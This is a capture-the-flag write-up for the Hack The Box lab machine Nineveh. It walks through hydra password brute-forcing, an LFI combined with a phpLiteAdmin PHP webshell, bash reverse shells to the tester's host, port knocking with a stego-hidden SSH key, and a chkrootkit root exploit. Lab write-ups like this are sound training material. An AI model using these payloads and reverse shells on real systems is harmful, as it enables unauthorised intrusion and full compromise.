# Nineveh: 10.10.10.43

## Hints

- You need both web apps to get a foothold
- For privesc to user, check machine categories for a hint
- You might need to do some steganography
- For privesc to root, look for odd file system or process stuff

## nmap

Starting with the usual `nmap` scan. Interesting ports:

```none
80/tcp  open  http     Apache httpd 2.4.18 ((Ubuntu))
443/tcp open  ssl/http Apache httpd 2.4.18 ((Ubuntu))
```

## 80: Recon + Gobuster

Looking at port 80 first - it shows the (old) default Apache home page. Same thing when adding `nineveh.htb` to the `/etc/hosts` file - so no virtual host routing going on.

![Port 80 Default page](screenshots/80_home.png)

Can't see anything else, so ran a `gobuster` on the service. No fancy options added.

```none
└─$ gobuster dir -t 20 -u http://nineveh.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster_80_root_medium.log
```

From this - only thing that returned was the `/department` directory. This was a web login form.

![Port 80 Department page](screenshots/80_department.png)

This was a nice form that gave away useful details. I tried a few simple username/password combos and noticed that the error message returned varied based on the input.

- `invalid username`
- `Invalid Password!`

From a quick test it seemed that `admin` was a valid username. Taking this as a hint to password attack the web form, I intercepted a request and forged a `hydra` command.

```none
└─$ hydra -l admin -P /usr/share/wordlists/rockyou.txt nineveh.htb http-post-form "/department/login.php:username=^USER^&password=^PASS^:F=Invalid Password"
```

After making a cup of tea - success!

```none
[STATUS] 2373.00 tries/min, 2373 tries in 00:01h, 14342026 to do in 100:44h, 16 active
[80][http-post-form] host: nineveh.htb   login: admin   password: 1q2w3e4r5t
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-07-04 14:48:59
```

Logged in and noticed a construction-style landing page. Had a look at the "Notes" section - which is literally notes! I thought it would have been a web app note taking thing - but it is a list of notes from "amrois" to the developer. The notes left are:

```none
Have you fixed the login page yet! hardcoded username and password is really bad idea!

check your serect folder to get in! figure it out! this is your challenge

Improve the db interface.
~amrois
```

If I have learned anything from HTB machines - notes like these are **VERY** useful. Given that I got this useful information - I was about to move on from this service when I noticed the URL for the "Notes" page.

```
http://nineveh.htb/department/manage.php?notes=files/ninevehNotes.txt
```

Looks like an LFI just waiting to happen. Tried a variety of combinations, and it took a while to get a PoC, and dump the `/etc/passwd` file.

```none
http://nineveh.htb/department/manage.php?notes=files/ninevehNotes.txt../../../../../../../etc/passwd
```

![Port 80 Department LFI](screenshots/80_department_lfi.png)

The web app provided some useful error messages - such as `No Note is selected.` and `File name too long.`. And also displayed a PHP include warning.

```none
<b>Warning</b>:  include(files/ninevehNotes.txt/../../../../etc/passwd): failed to open stream: No such file or directory in <b>/var/www/html/department/manage.php</b> on line <b>31</b>
```

At the time I couldn't see anything else to do with this service - unless I found a way to upload a file. Which might be hard given the filename length limit. I noticed this when trying to extract other useful configuration files to get more info - but didn't have much luck.

## 443: Recon + Gobuster

Browsing to port 443 displays a different website: `https://nineveh.htb/`. Only an image - and not really sure what the image is about. Out of good habit I saved the image - just in case.

![Port 443 Landing page](screenshots/443_home.png)

Since it seems like nothing else was available, I tried a `gobuster` against the site.

```none
└─$ gobuster dir -t 20 -u https://nineveh.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster_443_root_medium.log -k
```

Found the `/db` directory which showed that the `phpLiteAdmin` service was running, with version 1.9. 

![Port 443 DB page](screenshots/443_db.png)

A quick searchsploit showed a variety of options.

```none
└─$ searchsploit phpliteadmin            
---------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                    |  Path
---------------------------------------------------------------------------------- ---------------------------------
phpLiteAdmin - 'table' SQL Injection                                              | php/webapps/38228.txt
phpLiteAdmin 1.1 - Multiple Vulnerabilities                                       | php/webapps/37515.txt
PHPLiteAdmin 1.9.3 - Remote PHP Code Injection                                    | php/webapps/24044.txt
phpLiteAdmin 1.9.6 - Multiple Vulnerabilities                                     | php/webapps/39714.txt
```

The most promising option was `PHPLiteAdmin 1.9.3 - Remote PHP Code Injection` which seemed to need access to the web panel to exploit. With this exploit, we could upload a PHP snippet, and run it with the LFI from port 80. The other exploits listed were for XSS, CSRF, HTML injection and SQL injection - and not useful in this challenge. The only option left to get web access, seemed to be password guessing. Luckily this form only has a password field - so no guessing usernames.

```none
└─$ hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.43 https-post-form "/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect password"
```

And success!

```none
[443][http-post-form] host: 10.10.10.43   login: admin   password: password123
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-07-04 16:11:51
```

I followed the instructions in the exploit provided. This was a challenge for me, and took me about 20-30 attempts to get the exploit working with the LFI. My main steps were:

- Create new database with a short name: `a.php`
- Select `a.php` database
- Create new table with 1 field (any name)
- Create new field (any name)
- Set type to `TEXT`
- Set default value to PHP code you want to run
- `<?php system($_REQUEST["b"]) ?>`

![443 Creating a new table in phpLiteAdmin](screenshots/443_phpliteadmin_new_table.png)

I kept all the names very short - 1 character. This was because I had numerous problems getting the file loaded via the LFI vulnerability - due to filename length limit on the LFI vulnerability. The final LFI used is listed below:

```none
http://nineveh.htb/department/manage.php?notes=files/ninevehNotes../../../../../../../var/tmp/a.php&b=whoami
```

After inspecting the code after getting access - turns out the web app code was only looking for the `ninevehNotes` string. So I could have limited my file name length suffering if I had enumerated the LFI correctly. I then intercepted a request to the specified URL in Burp. Then added in a bash reverse shell back to my machine.

```code
&b=bash -c 'bash -i >& /dev/tcp/10.10.14.56/9001 0>&1'
```

And finally! Got a shell as `www-data`! This felt like a battle!

![80 Getting a reverse shell using LFI](screenshots/80_trigger_lfi.png)

```none
└─$ nc -lvnp 9002
listening on [any] 9002 ...
connect to [10.10.14.56] from (UNKNOWN) [10.10.10.43] 37402
bash: cannot set terminal process group (1375): Inappropriate ioctl for device
bash: no job control in this shell
www-data@nineveh:/var/www/html/department$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Privesc: `www-data` to `amrois`

To be honest - this privesc was hard for me and I wouldn't have got it without looking up a little hint. I keep forgetting to add steganography to my methodology, and have never encountered a port knocking implementation before. Looking back - all the information was provided:

- Port knocking was listed in the machine categories and in the linpeas script output
- The link to steganography was hinted at in the "Notes"

Once I had a hint of how to proceed - managed to find the `nineveh.png` file that was displayed on the web site on port 443. Checking the magic bytes (using the `file` command) showed it as an image.

```none
www-data@nineveh:/var/www/ssl/secure_notes$ file nineveh.png 
nineveh.png: PNG image data, 1497 x 746, 8-bit/color RGB, non-interlaced
```

Then tried the `strings` command to see if there was any hidden information - which resulted in a private and public key. It turns out there was some data appended to the end of the PNG image, after the `IEND` to signify the end of the image.

```none
www-data@nineveh:/var/www/ssl/secure_notes$ strings -n 15 nineveh.png 
secret/nineveh.priv
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAri9EUD7bwqbmEsEpIeTr2KGP/wk8YAR0Z4mmvHNJ3UfsAhpI
H9/Bz1abFbrt16vH6/jd8m0urg/Em7d/FJncpPiIH81JbJ0pyTBvIAGNK7PhaQXU
PdT9y0xEEH0apbJkuknP4FH5Zrq0nhoDTa2WxXDcSS1ndt/M8r+eTHx1bVznlBG5
FQq1/wmB65c8bds5tETlacr/15Ofv1A2j+vIdggxNgm8A34xZiP/WV7+7mhgvcnI
3oqwvxCI+VGhQZhoV9Pdj4+D4l023Ub9KyGm40tinCXePsMdY4KOLTR/z+oj4sQT
X+/1/xcl61LADcYk0Sw42bOb+yBEyc1TTq1NEQIDAQABAoIBAFvDbvvPgbr0bjTn
KiI/FbjUtKWpWfNDpYd+TybsnbdD0qPw8JpKKTJv79fs2KxMRVCdlV/IAVWV3QAk
FYDm5gTLIfuPDOV5jq/9Ii38Y0DozRGlDoFcmi/mB92f6s/sQYCarjcBOKDUL58z
GRZtIwb1RDgRAXbwxGoGZQDqeHqaHciGFOugKQJmupo5hXOkfMg/G+Ic0Ij45uoR
JZecF3lx0kx0Ay85DcBkoYRiyn+nNgr/APJBXe9Ibkq4j0lj29V5dT/HSoF17VWo
9odiTBWwwzPVv0i/JEGc6sXUD0mXevoQIA9SkZ2OJXO8JoaQcRz628dOdukG6Utu
Bato3bkCgYEA5w2Hfp2Ayol24bDejSDj1Rjk6REn5D8TuELQ0cffPujZ4szXW5Kb
ujOUscFgZf2P+70UnaceCCAPNYmsaSVSCM0KCJQt5klY2DLWNUaCU3OEpREIWkyl
1tXMOZ/T5fV8RQAZrj1BMxl+/UiV0IIbgF07sPqSA/uNXwx2cLCkhucCgYEAwP3b
vCMuW7qAc9K1Amz3+6dfa9bngtMjpr+wb+IP5UKMuh1mwcHWKjFIF8zI8CY0Iakx
DdhOa4x+0MQEtKXtgaADuHh+NGCltTLLckfEAMNGQHfBgWgBRS8EjXJ4e55hFV89
P+6+1FXXA1r/Dt/zIYN3Vtgo28mNNyK7rCr/pUcCgYEAgHMDCp7hRLfbQWkksGzC
fGuUhwWkmb1/ZwauNJHbSIwG5ZFfgGcm8ANQ/Ok2gDzQ2PCrD2Iizf2UtvzMvr+i
tYXXuCE4yzenjrnkYEXMmjw0V9f6PskxwRemq7pxAPzSk0GVBUrEfnYEJSc/MmXC
iEBMuPz0RAaK93ZkOg3Zya0CgYBYbPhdP5FiHhX0+7pMHjmRaKLj+lehLbTMFlB1
MxMtbEymigonBPVn56Ssovv+bMK+GZOMUGu+A2WnqeiuDMjB99s8jpjkztOeLmPh
PNilsNNjfnt/G3RZiq1/Uc+6dFrvO/AIdw+goqQduXfcDOiNlnr7o5c0/Shi9tse
i6UOyQKBgCgvck5Z1iLrY1qO5iZ3uVr4pqXHyG8ThrsTffkSVrBKHTmsXgtRhHoc
il6RYzQV/2ULgUBfAwdZDNtGxbu5oIUB938TCaLsHFDK6mSTbvB/DywYYScAWwF7
fw4LVXdQMjNJC3sn3JaqY1zJkE4jXlZeNQvCx4ZadtdJD9iO+EUG
-----END RSA PRIVATE KEY-----
secret/nineveh.pub
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCuL0RQPtvCpuYSwSkh5OvYoY//CTxgBHRniaa8c0ndR+wCGkgf38HPVpsVuu3Xq8fr+N3ybS6uD8Sbt38Umdyk+IgfzUlsnSnJMG8gAY0rs+FpBdQ91P3LTEQQfRqlsmS6Sc/gUflmurSeGgNNrZbFcNxJLWd238zyv55MfHVtXOeUEbkVCrX/CYHrlzxt2zm0ROVpyv/Xk5+/UDaP68h2CDE2CbwDfjFmI/9ZXv7uaGC9ycjeirC/EIj5UaFBmGhX092Pj4PiXTbdRv0rIabjS2KcJd4+wx1jgo4tNH/P6iPixBNf7/X/FyXrUsANxiTRLDjZs5v7IETJzVNOrU0R amrois@nineveh.htb
```

This threw me off - as there is no SSH open on this machine... or so I thought. I quickly read a short guide on [port knocking](https://www.howtogeek.com/442733/how-to-use-port-knocking-on-linux-and-why-you-shouldnt/) and got the main idea. First step was to determine what the port sequence was. This is available in the `/etc/knockd.conf` file.

```none
www-data@nineveh:/dev/shm$ cat /etc/knockd.conf 
[options]
 logfile = /var/log/knockd.log
 interface = ens160

[openSSH]
 sequence = 571, 290, 911 
 seq_timeout = 5
 start_command = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
 tcpflags = syn

[closeSSH]
 sequence = 911,290,571
 seq_timeout = 5
 start_command = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
 tcpflags = syn
```

Basically, if we send a SYN request to the three specified ports (571, 290, 911) within 5 seconds of each other - then port 22 will open for our specific IP address. This can be accomplished a lot of ways - for example, manually scripting and using tools such as nmap. However, the `knock` program is far easier - but does require an `apt` install on Kali.

To start, copy the private key to a file, in my case named `id_rsa`. Then set the correct permissions to the file. Perform a port knock to open the SSH port 22.

```none
touch id_rsa
chmod 600 id_rsa
sudo knock 10.10.10.43 571 290 911 -d 400
```

Then connect:

```none
└─$ ssh amrois@10.10.10.43 -i id_rsa 
Ubuntu 16.04.2 LTS
Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-62-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

288 packages can be updated.
207 updates are security updates.


You have mail.
Last login: Mon Jul  3 00:19:59 2017 from 192.168.0.14
amrois@nineveh:~$ id
uid=1000(amrois) gid=1000(amrois) groups=1000(amrois)
```

## Flag: User

With access as the `amrois` user, getting the flag is accessible:

```none
amrois@nineveh:~$ pwd
/home/amrois
amrois@nineveh:~$ wc -c user.txt 
33 user.txt
```

## Privesc: `armois` to `root`

Ran `linpeas` on the target - and got some interesting results. There was a crontab entry that was highlighted and looked interesting.

```none
*/10 * * * * /usr/sbin/report-reset.sh
```

The `report-reset.sh` script is set to run every 10 minutes. The contents of the script are interesting. There is a line to remove all `.txt` files from the `/reports` folder.

```none
amrois@nineveh:/dev/shm$ cat /usr/sbin/report-reset.sh
#!/bin/bash

rm -rf /report/*.txt
```

Having a `report` directory at the root level is kind of weird. So had a look at the conents. There were a bunch of txt files each run at set 1 minute intervals. The contents of the txt files looked like a lot of checks - but I had never seen this type of output before. A quick Google search of some of the more unique lines gave it away - a tool named `chkrootkit`. For reference, I just searched the last line of the file:

```none
Checking `OSX_RSPLUG'... not infected
```

Having a search for the program revealed it ran as `root` too.

```none
amrois@nineveh:/report$ ll -la /usr/bin/chkrootkit 
-rwx--x--x 1 root root 76181 Jul  2  2017 /usr/bin/chkrootkit*
```

After digging around for a while - finally got the common sense to search `chkrootkit` on `searchsploit`.

```none
└─$ searchsploit chkrootkit
---------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                    |  Path
---------------------------------------------------------------------------------- ---------------------------------
Chkrootkit - Local Privilege Escalation (Metasploit)                              | linux/local/38775.rb
Chkrootkit 0.49 - Local Privilege Escalation                                      | linux/local/33899.txt
```

Having a look at the exploit, it was targeted at version 0.49.

```none
┌──(thomas㉿kali)-[~/machines/nineveh]
└─$ searchsploit -m linux/local/33899.txt     
```

The process was quite simple - and seems like the intended method to gain root access. Create a specially crafted `update` file in the `/tmp` folder.

```
cd /tmp
touch update
chmod +X update
```

And... insert some useful code. For the first test I tried something to just touch a file and see who owned it, and also to dump the `root.txt` flag to another file in `/tmp`.

```none
#!/bin/bash

echo $(id) > /tmp/id.txt
cat /root/root.txt > /tmp/root.txt
```

After that test worked, tried to get a reverse shell using the same exploit.

```none
amrois@nineveh:/tmp$ cat update 
#!/bin/bash

bash -c 'exec bash -i &>/dev/tcp/10.10.14.56/9003 <&1'
```

For my notes, here is the one liner I used to populate the file:

```none
echo -e '#!/bin/bash\n\nbash -i >& /dev/tcp/10.10.14.24/443 0>&1' > update
```

And... a reverse shell!

```none
└─$ nc -lvnp 9003                                 
listening on [any] 9003 ...
connect to [10.10.14.56] from (UNKNOWN) [10.10.10.43] 42682
bash: cannot set terminal process group (3241): Inappropriate ioctl for device
bash: no job control in this shell
root@nineveh:~# id
id
uid=0(root) gid=0(root) groups=0(root)
```

## Lessons Learned

- In more complex boxes, remember that intel will most likely need to be joined
- Always look at HTB categories - in this example knocked was specified
- Steganography seems common in HTB - add this to current methodology
- Always document bare minimum exploits to get access again when stop/starting a box
- Use more privesc scripts to find issues - combining them helps

## Useful Resources

- [HackTheBox Nineveh - ippsec](https://www.youtube.com/watch?v=K9DKULxSBK4)
- [HTB: Nineveh by 0xdf](https://0xdf.gitlab.io/2020/04/22/htb-nineveh.html)
